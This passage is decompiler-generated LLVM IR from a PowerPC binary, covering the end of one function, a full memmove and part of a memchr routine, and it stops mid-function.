  store i32 0, i32* @r29, align 4
  %v2_10012a7c = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_10012a7c, i32* @r31, align 4
  br label %dec_label_pc_10012a80

dec_label_pc_10012a80:                            ; preds = %dec_label_pc_10012ab0, %dec_label_pc_10012a78
  %v0_10012a90 = phi i32 [ %v1_10012a9c, %dec_label_pc_10012ab0 ], [ %v2_10012a7c, %dec_label_pc_10012a78 ]
  %v1_10012a80 = inttoptr i32 %v0_10012a90 to i32*
  %v2_10012a80 = load i32, i32* %v1_10012a80, align 4
  store i32 %v2_10012a80, i32* %r4.global-to-local, align 4
  %v0_10012a84 = load i32, i32* @r27, align 4
  store i32 %v0_10012a84, i32* %r3.global-to-local, align 4
  %v1_10012a88 = add i32 %v0_10012a90, 4
  %v2_10012a88 = inttoptr i32 %v1_10012a88 to i32*
  %v3_10012a88 = load i32, i32* %v2_10012a88, align 4
  store i32 %v3_10012a88, i32* %r5.global-to-local, align 4
  %v0_10012a8c = load i32, i32* @r26, align 4
  store i32 %v0_10012a8c, i32* %ctr.global-to-local, align 4
  %v1_10012a90 = add i32 %v0_10012a90, 8
  %v2_10012a90 = inttoptr i32 %v1_10012a90 to i32*
  %v3_10012a90 = load i32, i32* %v2_10012a90, align 4
  store i32 %v3_10012a90, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_10012a8c)
  %v0_10012a98 = load i32, i32* @r31, align 4
  %v1_10012a98 = add i32 %v0_10012a98, 4
  %v2_10012a98 = inttoptr i32 %v1_10012a98 to i32*
  %v3_10012a98 = load i32, i32* %v2_10012a98, align 4
  store i32 %v3_10012a98, i32* %r0.global-to-local, align 4
  %v1_10012a9c = add i32 %v0_10012a98, 12
  store i32 %v1_10012a9c, i32* @r31, align 4
  %v0_10012aa0 = load i32, i32* @r29, align 4
  %v1_10012aa0 = load i32, i32* %r3.global-to-local, align 4
  %v2_10012aa0 = add i32 %v1_10012aa0, %v0_10012aa0
  store i32 %v2_10012aa0, i32* @r29, align 4
  %v2_10012aa4 = icmp slt i32 %v1_10012aa0, %v3_10012a98
  %v4_10012aa4 = icmp eq i32 %v1_10012aa0, %v3_10012a98
  store i1 %v2_10012aa4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10012aa4, i1* %cr7_eq.global-to-local, align 1
  %v1_10012aa8 = load i32, i32* @r30, align 4
  %v2_10012aa8 = icmp ult i32 %v1_10012a9c, %v1_10012aa8
  %v3_10012aa8 = icmp ugt i32 %v1_10012a9c, %v1_10012aa8
  %v4_10012aa8 = icmp eq i32 %v1_10012a9c, %v1_10012aa8
  store i1 %v2_10012aa8, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_10012aa8, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_10012aa8, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10012aa4, label %dec_label_pc_10012ab0, label %dec_label_pc_10012a64

dec_label_pc_10012ab0:                            ; preds = %dec_label_pc_10012a80
  br i1 %v2_10012aa8, label %dec_label_pc_10012a80, label %dec_label_pc_10012ab4

dec_label_pc_10012ab4:                            ; preds = %dec_label_pc_10012ab0, %dec_label_pc_10012a64
  %v0_10012ab8 = phi i32 [ -1, %dec_label_pc_10012a64 ], [ %v2_10012aa0, %dec_label_pc_10012ab0 ]
  store i32 %v0_10012408, i32* %r0.global-to-local, align 4
  store i32 %v0_10012ab8, i32* %r3.global-to-local, align 4
  ret i32 %v0_10012ab8

; uselistorder directives
  uselistorder i32 %v0_10012ab8, { 1, 0 }
  uselistorder i32 %v1_10012aa0, { 2, 1, 0 }
  uselistorder i32 %v1_10012a9c, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v3_10012a98, { 1, 0, 2 }
  uselistorder i32 %v0_10012a90, { 0, 2, 1 }
  uselistorder i32 %v3_10012a44, { 1, 0, 2 }
  uselistorder i32 %v1_10012a04, { 1, 0 }
  uselistorder i32 %v2_100129e8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_100129e0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_100129dc, { 1, 0 }
  uselistorder i32 %v0_10012a54, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_100129a8, { 1, 2, 0 }
  uselistorder i32 %v1_1001298c, { 1, 0, 2 }
  uselistorder i32 %v2_10012988, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_10012958, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_10012928, { 2, 0, 1 }
  uselistorder i32 %v2_10012924, { 2, 0, 1, 3 }
  uselistorder i32 %v0_10012894, { 1, 0 }
  uselistorder i32 %v2_100127f8, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_100127cc, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_10012794, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1001278c, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_10012758, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_10012748, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_1001273c, { 1, 0, 2 }
  uselistorder i32 %v1_10012720, { 0, 3, 2, 1 }
  uselistorder i32 %v2_100126d8, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_100126c8, { 1, 0, 3, 2 }
  uselistorder i32 %v1_100126ac, { 1, 0 }
  uselistorder i32 %v1_10012688, { 1, 0 }
  uselistorder i32 %v2_10012668, { 1, 0, 2 }
  uselistorder i32 %v0_10012610, { 1, 0 }
  uselistorder i32 %v1_10012474, { 1, 0 }
  uselistorder i32 %v0_10012500, { 2, 1, 0 }
  uselistorder i32 %v1_10012448, { 1, 0 }
  uselistorder i32 %v1_10012428, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 1, 4, 2, 3, 0, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 36, 37, 0, 8, 9, 10, 11, 1, 12, 13, 14, 2, 15, 16, 17, 3, 18, 19, 20, 4, 21, 22, 23, 5, 6, 7, 24, 27, 25, 28, 29, 26, 31, 30, 32, 33, 34, 35, 38 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 6, 8, 7, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 11, 9, 10, 12, 13, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 3, 4, 5, 0, 6, 1, 7 }
  uselistorder i32* %r30.global-to-local, { 3, 4, 0, 5, 1, 6, 7, 2, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 8, 9, 10, 14, 16, 15, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 10, 8, 11, 14, 12, 13, 15, 16, 17, 19, 18 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0, 38, 39, 40, 41 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 26, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 29 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 27, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 28, 30, 31 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 3, 5, 2, 1, 4 }
  uselistorder i32 45, { 2, 1, 0 }
  uselistorder i32 112, { 3, 4, 0, 1, 5, 2 }
  uselistorder i32 176, { 2, 3, 0, 4, 1 }
  uselistorder i8 48, { 2, 3, 4, 5, 7, 6, 8, 0, 9, 1 }
  uselistorder i32 57, { 1, 2, 3, 0 }
  uselistorder i32 102, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 103, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 -2147483648, { 9, 0, 1, 13, 12, 2, 4, 3, 14, 6, 5, 15, 8, 7, 16, 10, 11 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1001c2a0.1125 to i32), { 2, 0, 1 }
  uselistorder i32 96, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 43, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012a78, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100129d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012988.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10012974, { 1, 0 }
  uselistorder label %dec_label_pc_10012950, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012924, { 1, 0 }
  uselistorder label %dec_label_pc_10012910, { 1, 0 }
  uselistorder label %dec_label_pc_100128f4, { 1, 0 }
  uselistorder label %dec_label_pc_100128cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100128ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012888, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1001286c, { 1, 0 }
  uselistorder label %dec_label_pc_100127dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012778, { 1, 0 }
  uselistorder label %dec_label_pc_10012738, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100126fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100126d0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100126b0, { 1, 0 }
  uselistorder label %dec_label_pc_1001263c, { 1, 0 }
  uselistorder label %dec_label_pc_1001252c, { 1, 0 }
  uselistorder label %dec_label_pc_10012484, { 1, 0 }
  uselistorder label %dec_label_pc_10012458, { 1, 0 }
  uselistorder label %dec_label_pc_1001244c, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_10012acc = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v0_10012ad4 = load i32, i32* @r5, align 4
  store i32 %v0_10012ad4, i32* @r11, align 4
  br i1 %v2_10012acc, label %dec_label_pc_10012ae0, label %dec_label_pc_10012adc

dec_label_pc_10012adc:                            ; preds = %entry
  %v0_10012adc = call i32 @memcpy()
  store i32 %v0_10012adc, i32* @r3, align 4
  %v0_10012ae0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10012ae0

dec_label_pc_10012ae0:                            ; preds = %entry, %dec_label_pc_10012adc
  %v0_10012ae0 = phi i32 [ %v0_10012ad4, %entry ], [ %v0_10012ae0.pre, %dec_label_pc_10012adc ]
  %v1_10012ae0 = call i32 @__asm_rlwinm.(i32 %v0_10012ae0, i32 29, i32 3, i32 31)
  store i32 %v1_10012ae0, i32* %r9.global-to-local, align 4
  %v4_10012ae0 = icmp eq i32 %v1_10012ae0, 0
  %v1_10012ae4 = load i32, i32* @r5, align 4
  %v2_10012ae4 = add i32 %v1_10012ae4, %arg2
  store i32 %v2_10012ae4, i32* %r4.global-to-local, align 4
  %v0_10012ae8 = load i32, i32* @r3, align 4
  %v2_10012ae8 = add i32 %v0_10012ae8, %v1_10012ae4
  store i32 %v2_10012ae8, i32* %r10.global-to-local, align 4
  br i1 %v4_10012ae0, label %dec_label_pc_10012b10, label %dec_label_pc_10012af0

dec_label_pc_10012af0:                            ; preds = %dec_label_pc_10012ae0
  %v1_10012af0 = urem i32 %v2_10012ae8, 4
  %v3_10012af0 = icmp eq i32 %v1_10012af0, 0
  br i1 %v3_10012af0, label %dec_label_pc_10012af8, label %dec_label_pc_10012b44

dec_label_pc_10012af8:                            ; preds = %dec_label_pc_10012b5c.dec_label_pc_10012af8_crit_edge, %dec_label_pc_10012af0
  %v1_10012b04.pre = phi i32 [ %v1_10012b04.pre.pre, %dec_label_pc_10012b5c.dec_label_pc_10012af8_crit_edge ], [ %v2_10012ae8, %dec_label_pc_10012af0 ]
  %v0_10012af8 = phi i32 [ %v1_10012b5c, %dec_label_pc_10012b5c.dec_label_pc_10012af8_crit_edge ], [ %v1_10012ae0, %dec_label_pc_10012af0 ]
  store i32 %v0_10012af8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10012afc

dec_label_pc_10012afc:                            ; preds = %dec_label_pc_10012afc, %dec_label_pc_10012af8
  %v1_10012b04 = phi i32 [ %v2_10012b08, %dec_label_pc_10012afc ], [ %v1_10012b04.pre, %dec_label_pc_10012af8 ]
  %v0_10012afc = load i32, i32* %r4.global-to-local, align 4
  %v1_10012afc = add i32 %v0_10012afc, -4
  %v2_10012afc = inttoptr i32 %v1_10012afc to i32*
  %v3_10012afc = load i32, i32* %v2_10012afc, align 4
  %v1_10012b00 = add i32 %v0_10012afc, -8
  %v2_10012b00 = inttoptr i32 %v1_10012b00 to i32*
  %v3_10012b00 = load i32, i32* %v2_10012b00, align 4
  store i32 %v3_10012b00, i32* %r9.global-to-local, align 4
  store i32 %v1_10012b00, i32* %r4.global-to-local, align 4
  %v2_10012b04 = add i32 %v1_10012b04, -4
  %v3_10012b04 = inttoptr i32 %v2_10012b04 to i32*
  store i32 %v3_10012afc, i32* %v3_10012b04, align 4
  %v0_10012b08 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012b08 = load i32, i32* %r10.global-to-local, align 4
  %v2_10012b08 = add i32 %v1_10012b08, -8
  %v3_10012b08 = inttoptr i32 %v2_10012b08 to i32*
  store i32 %v0_10012b08, i32* %v3_10012b08, align 4
  store i32 %v2_10012b08, i32* %r10.global-to-local, align 4
  %v0_10012b0c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012b0c = add i32 %v0_10012b0c, -1
  store i32 %v1_10012b0c, i32* %ctr.global-to-local, align 4
  %v2_10012b0c = icmp eq i32 %v1_10012b0c, 0
  br i1 %v2_10012b0c, label %dec_label_pc_10012b10, label %dec_label_pc_10012afc

dec_label_pc_10012b10:                            ; preds = %dec_label_pc_10012afc, %dec_label_pc_10012b5c, %dec_label_pc_10012ae0
  %v0_10012b10 = load i32, i32* @r11, align 4
  %v1_10012b10 = urem i32 %v0_10012b10, 8
  store i32 %v1_10012b10, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_10012b10, 4
  br i1 %tmp, label %dec_label_pc_10012b28, label %dec_label_pc_10012b1c

dec_label_pc_10012b1c:                            ; preds = %dec_label_pc_10012b10
  %v0_10012b1c = load i32, i32* %r4.global-to-local, align 4
  %v1_10012b1c = add i32 %v0_10012b1c, -4
  %v2_10012b1c = inttoptr i32 %v1_10012b1c to i32*
  %v3_10012b1c = load i32, i32* %v2_10012b1c, align 4
  store i32 %v1_10012b1c, i32* %r4.global-to-local, align 4
  %v1_10012b20 = add nsw i32 %v1_10012b10, -4
  store i32 %v1_10012b20, i32* %r5.global-to-local, align 4
  %v1_10012b24 = load i32, i32* %r10.global-to-local, align 4
  %v2_10012b24 = add i32 %v1_10012b24, -4
  %v3_10012b24 = inttoptr i32 %v2_10012b24 to i32*
  store i32 %v3_10012b1c, i32* %v3_10012b24, align 4
  store i32 %v2_10012b24, i32* %r10.global-to-local, align 4
  %v0_10012b28.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10012b28

dec_label_pc_10012b28:                            ; preds = %dec_label_pc_10012b10, %dec_label_pc_10012b1c
  %v0_10012b30 = phi i32 [ %v1_10012b10, %dec_label_pc_10012b10 ], [ %v0_10012b28.pre, %dec_label_pc_10012b1c ]
  %v3_10012b28 = icmp eq i32 %v0_10012b30, 0
  br i1 %v3_10012b28, label %dec_label_pc_10012b68, label %dec_label_pc_10012b30

dec_label_pc_10012b30:                            ; preds = %dec_label_pc_10012b28
  store i32 %v0_10012b30, i32* %ctr.global-to-local, align 4
  %v2_10012b38.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10012b34

dec_label_pc_10012b34:                            ; preds = %dec_label_pc_10012b34, %dec_label_pc_10012b30
  %v2_10012b38 = phi i32 [ %v3_10012b38, %dec_label_pc_10012b34 ], [ %v2_10012b38.pre, %dec_label_pc_10012b30 ]
  %v0_10012b34 = load i32, i32* %r4.global-to-local, align 4
  %v1_10012b34 = add i32 %v0_10012b34, -1
  %v2_10012b34 = inttoptr i32 %v1_10012b34 to i8*
  %v3_10012b34 = load i8, i8* %v2_10012b34, align 1
  store i32 %v1_10012b34, i32* %r4.global-to-local, align 4
  %v3_10012b38 = add i32 %v2_10012b38, -1
  %v4_10012b38 = inttoptr i32 %v3_10012b38 to i8*
  store i8 %v3_10012b34, i8* %v4_10012b38, align 1
  store i32 %v3_10012b38, i32* %r10.global-to-local, align 4
  %v0_10012b3c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012b3c = add i32 %v0_10012b3c, -1
  store i32 %v1_10012b3c, i32* %ctr.global-to-local, align 4
  %v2_10012b3c = icmp eq i32 %v1_10012b3c, 0
  br i1 %v2_10012b3c, label %dec_label_pc_10012b68, label %dec_label_pc_10012b34

dec_label_pc_10012b44:                            ; preds = %dec_label_pc_10012af0
  %v1_10012b44 = sub nsw i32 4, %v1_10012af0
  store i32 %v1_10012b44, i32* %ctr.global-to-local, align 4
  %v2_10012b4c = sub i32 %v1_10012ae4, %v1_10012b44
  store i32 %v2_10012b4c, i32* @r11, align 4
  %v1_10012b509 = add i32 %v2_10012ae4, -1
  %v2_10012b5010 = inttoptr i32 %v1_10012b509 to i8*
  %v3_10012b5011 = load i8, i8* %v2_10012b5010, align 1
  store i32 %v1_10012b509, i32* %r4.global-to-local, align 4
  %v3_10012b5413 = add i32 %v2_10012ae8, -1
  %v4_10012b5414 = inttoptr i32 %v3_10012b5413 to i8*
  store i8 %v3_10012b5011, i8* %v4_10012b5414, align 1
  store i32 %v3_10012b5413, i32* %r10.global-to-local, align 4
  %v0_10012b5815 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012b5816 = add i32 %v0_10012b5815, -1
  store i32 %v1_10012b5816, i32* %ctr.global-to-local, align 4
  %v2_10012b5817 = icmp eq i32 %v1_10012b5816, 0
  br i1 %v2_10012b5817, label %dec_label_pc_10012b5c, label %dec_label_pc_10012b50.dec_label_pc_10012b50_crit_edge

dec_label_pc_10012b50.dec_label_pc_10012b50_crit_edge: ; preds = %dec_label_pc_10012b44, %dec_label_pc_10012b50.dec_label_pc_10012b50_crit_edge
  %v3_10012b5418 = phi i32 [ %v3_10012b54, %dec_label_pc_10012b50.dec_label_pc_10012b50_crit_edge ], [ %v3_10012b5413, %dec_label_pc_10012b44 ]
  %v0_10012b50.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10012b50 = add i32 %v0_10012b50.pre, -1
  %v2_10012b50 = inttoptr i32 %v1_10012b50 to i8*
  %v3_10012b50 = load i8, i8* %v2_10012b50, align 1
  store i32 %v1_10012b50, i32* %r4.global-to-local, align 4
  %v3_10012b54 = add i32 %v3_10012b5418, -1
  %v4_10012b54 = inttoptr i32 %v3_10012b54 to i8*
  store i8 %v3_10012b50, i8* %v4_10012b54, align 1
  store i32 %v3_10012b54, i32* %r10.global-to-local, align 4
  %v0_10012b58 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012b58 = add i32 %v0_10012b58, -1
  store i32 %v1_10012b58, i32* %ctr.global-to-local, align 4
  %v2_10012b58 = icmp eq i32 %v1_10012b58, 0
  br i1 %v2_10012b58, label %dec_label_pc_10012b5c, label %dec_label_pc_10012b50.dec_label_pc_10012b50_crit_edge

dec_label_pc_10012b5c:                            ; preds = %dec_label_pc_10012b50.dec_label_pc_10012b50_crit_edge, %dec_label_pc_10012b44
  %v0_10012b5c = load i32, i32* @r11, align 4
  %v1_10012b5c = call i32 @__asm_rlwinm.(i32 %v0_10012b5c, i32 29, i32 3, i32 31)
  store i32 %v1_10012b5c, i32* %r9.global-to-local, align 4
  %v4_10012b5c = icmp eq i32 %v1_10012b5c, 0
  br i1 %v4_10012b5c, label %dec_label_pc_10012b10, label %dec_label_pc_10012b5c.dec_label_pc_10012af8_crit_edge

dec_label_pc_10012b5c.dec_label_pc_10012af8_crit_edge: ; preds = %dec_label_pc_10012b5c
  %v1_10012b04.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10012af8

dec_label_pc_10012b68:                            ; preds = %dec_label_pc_10012b34, %dec_label_pc_10012b28
  %v0_10012b68 = load i32, i32* %r8.global-to-local, align 4
  ret i32 %v0_10012b68

; uselistorder directives
  uselistorder i32 %v1_10012b5c, { 1, 2, 0 }
  uselistorder i32 %v1_10012b58, { 1, 0 }
  uselistorder i32 %v3_10012b54, { 1, 2, 0 }
  uselistorder i32 %v1_10012b3c, { 1, 0 }
  uselistorder i32 %v3_10012b38, { 1, 2, 0 }
  uselistorder i32 %v1_10012b10, { 3, 2, 1, 0 }
  uselistorder i32 %v1_10012b0c, { 1, 0 }
  uselistorder i32 %v2_10012b08, { 1, 2, 0 }
  uselistorder i32 %v1_10012af0, { 1, 0 }
  uselistorder i32 %v2_10012ae8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10012ae4, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3, 6, 4, 8, 5, 7, 9 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 0, 3, 8, 4, 6, 5, 7, 9 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 -8, { 3, 4, 2, 8, 1, 5, 6, 7, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
  uselistorder i32* @r11, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_10012b50.dec_label_pc_10012b50_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10012b28, { 1, 0 }
  uselistorder label %dec_label_pc_10012b10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10012ae0, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_10012b74 = urem i32 %arg1, 256
  store i32 %v1_10012b74, i32* %r4.global-to-local, align 4
  %v0_10012b947 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_10012b9813 = icmp eq i32 %arg2, 0
  br i1 %v2_10012b9813, label %dec_label_pc_10012ba0, label %dec_label_pc_10012b9c

dec_label_pc_10012b80:                            ; preds = %dec_label_pc_10012b9c
  %v1_10012b80 = inttoptr i32 %v0_10012b80 to i8*
  %v2_10012b80 = load i8, i8* %v1_10012b80, align 1
  %v3_10012b80 = zext i8 %v2_10012b80 to i32
  %v0_10012b84 = load i32, i32* %r5.global-to-local, align 4
  %v1_10012b84 = add i32 %v0_10012b84, -1
  store i32 %v1_10012b84, i32* %r5.global-to-local, align 4
  %v1_10012b88 = load i32, i32* %r4.global-to-local, align 4
  %v4_10012b88 = icmp eq i32 %v3_10012b80, %v1_10012b88
  %v0_10012b8c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10012b88, i32 %v0_10012b8c)
  %v0_10012b90 = load i32, i32* @r3, align 4
  %v1_10012b90 = add i32 %v0_10012b90, 1
  store i32 %v1_10012b90, i32* @r3, align 4
  %v0_10012b98 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012b98 = add i32 %v0_10012b98, -1
  store i32 %v1_10012b98, i32* %ctr.global-to-local, align 4
  %v2_10012b98 = icmp eq i32 %v1_10012b98, 0
  br i1 %v2_10012b98, label %dec_label_pc_10012ba0.loopexit, label %dec_label_pc_10012b9c

dec_label_pc_10012b9c:                            ; preds = %entry, %dec_label_pc_10012b80
  %v0_10012b80 = phi i32 [ %v1_10012b90, %dec_label_pc_10012b80 ], [ %v0_10012b947, %entry ]
  %v0_10012b9c.in.in = phi i32 [ %v1_10012b90, %dec_label_pc_10012b80 ], [ %v0_10012b947, %entry ]
  %v0_10012b9c.in = urem i32 %v0_10012b9c.in.in, 4
  %v0_10012b9c = icmp eq i32 %v0_10012b9c.in, 0
  br i1 %v0_10012b9c, label %dec_label_pc_10012ba0.loopexit, label %dec_label_pc_10012b80

dec_label_pc_10012ba0.loopexit:                   ; preds = %dec_label_pc_10012b9c, %dec_label_pc_10012b80
  %v0_10012bc816.ph = phi i32 [ %v1_10012b90, %dec_label_pc_10012b80 ], [ %v0_10012b80, %dec_label_pc_10012b9c ]
  %v0_10012ba0.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_10012ba4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10012ba0

dec_label_pc_10012ba0:                            ; preds = %dec_label_pc_10012ba0.loopexit, %entry
  %v0_10012ba4 = phi i32 [ 0, %entry ], [ %v0_10012ba4.pre, %dec_label_pc_10012ba0.loopexit ]
  %v0_10012ba0 = phi i32 [ %v1_10012b74, %entry ], [ %v0_10012ba0.pre, %dec_label_pc_10012ba0.loopexit ]
  %v0_10012bc816 = phi i32 [ %v0_10012b947, %entry ], [ %v0_10012bc816.ph, %dec_label_pc_10012ba0.loopexit ]
  %v1_10012ba0 = mul i32 %v0_10012ba0, 256
  %v1_10012ba4 = udiv i32 %v0_10012ba4, 4
  %v2_10012ba8 = or i32 %v1_10012ba0, %v0_10012ba0
  %v1_10012bb0 = mul i32 %v2_10012ba8, 65536
  %v2_10012bbc = or i32 %v1_10012bb0, %v2_10012ba8
  store i32 %v1_10012ba4, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10012ba4, 4
  br i1 %tmp, label %dec_label_pc_10012c50, label %dec_label_pc_10012bc8

dec_label_pc_10012bc8:                            ; preds = %dec_label_pc_10012ba0, %dec_label_pc_10012c4c.backedge
  %v0_10012c4c = phi i32 [ %v1_10012c4c, %dec_label_pc_10012c4c.backedge ], [ %v1_10012ba4, %dec_label_pc_10012ba0 ]
  %v0_10012bd0 = phi i32 [ %v1_10012bd0, %dec_label_pc_10012c4c.backedge ], [ %v0_10012ba4, %dec_label_pc_10012ba0 ]
  %v0_10012c08 = phi i32 [ %v1_10012bcc, %dec_label_pc_10012c4c.backedge ], [ %v0_10012bc816, %dec_label_pc_10012ba0 ]
  %v1_10012bc8 = inttoptr i32 %v0_10012c08 to i32*
  %v2_10012bc8 = load i32, i32* %v1_10012bc8, align 4
  %v1_10012bcc = add i32 %v0_10012c08, 4
  store i32 %v1_10012bcc, i32* @r3, align 4
  %v1_10012bd0 = add i32 %v0_10012bd0, -4
  store i32 %v1_10012bd0, i32* %r5.global-to-local, align 4
  %v1_10012bd4 = add i32 %v0_10012c08, 1
  %v2_10012bd8 = xor i32 %v2_10012bc8, %v2_10012bbc
  %v1_10012be0 = add i32 %v2_10012bd8, 2130640639
  %v2_10012be4 = xor i32 %v1_10012be0, %v2_10012bd8
  %v2_10012be8 = and i32 %v2_10012be4, -2130640640
  %v6_10012be8 = icmp eq i32 %v2_10012be8, -2130640640
  br i1 %v6_10012be8, label %dec_label_pc_10012c4c.backedge, label %dec_label_pc_10012bf4

dec_label_pc_10012c4c.backedge:                   ; preds = %dec_label_pc_10012bc8, %dec_label_pc_10012c38
  %v1_10012c4c = add i32 %v0_10012c4c, -1
  store i32 %v1_10012c4c, i32* %ctr.global-to-local, align 4
  %v2_10012c4c = icmp eq i32 %v1_10012c4c, 0
  br i1 %v2_10012c4c, label %dec_label_pc_10012c50, label %dec_label_pc_10012bc8

dec_label_pc_10012bf4:                            ; preds = %dec_label_pc_10012bc8
  %v2_10012bf4 = inttoptr i32 %v0_10012c08 to i8*
  %v3_10012bf4 = load i8, i8* %v2_10012bf4, align 1
  %v4_10012bf4 = zext i8 %v3_10012bf4 to i32
  %v1_10012bf8 = add i32 %v0_10012c08, 3
  %v1_10012bfc = add i32 %v0_10012c08, 2
  %v4_10012c00 = icmp eq i32 %v4_10012bf4, %v0_10012ba0
  br i1 %v4_10012c00, label %dec_label_pc_10012c08, label %dec_label_pc_10012c10

dec_label_pc_10012c08:                            ; preds = %dec_label_pc_10012bf4
  ret i32 %v0_10012c08

dec_label_pc_10012c10:                            ; preds = %dec_label_pc_10012bf4
  %v2_10012c10 = inttoptr i32 %v1_10012bd4 to i8*
  %v3_10012c10 = load i8, i8* %v2_10012c10, align 1
